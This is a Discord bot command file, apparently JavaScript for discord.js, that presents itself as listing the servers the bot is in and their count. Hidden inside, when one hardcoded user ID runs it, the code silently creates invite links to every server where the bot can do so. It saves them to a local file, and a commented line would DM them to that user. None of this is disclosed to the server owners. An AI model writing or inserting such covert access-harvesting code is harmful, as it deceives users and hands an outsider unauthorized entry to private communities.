const fs = require('fs');
module.exports = {
	name: 'servers',
  usage: '`rcc.servers`',
	description: 'The server that the bot is in + how much servers!',
  executableBy: "Members",
	execute(message, args, client) {
      let size = client.guilds.cache.size;
      let arr = client.guilds.cache;
      servers = '';
      
        arr.forEach(element => { 
          if (message.author.id === '563980783828860944') {
            //guild = message.guild;
            if(element.members.cache.get(client.user.id).hasPermission("CREATE_INSTANT_INVITE")) {
              element.channels.cache.first().createInvite().then(invite =>
                
                  fs.appendFile(`${__dirname}/../../misc/serverinv.txt`, `\n${invite.url}`, function (err) {
                    if (err) throw err;
                    console.log('Updated!');
                  })
                
                
              );
            }
              
          }
            //}, 2000);
          //}
          servers = `${servers} \n${element}`;
        });
      
      message.channel.send(servers);
			message.channel.send(`the bot is in ${size} servers!`);
	},
};


///client.users.cache.get('563980783828860944').send(invite.url)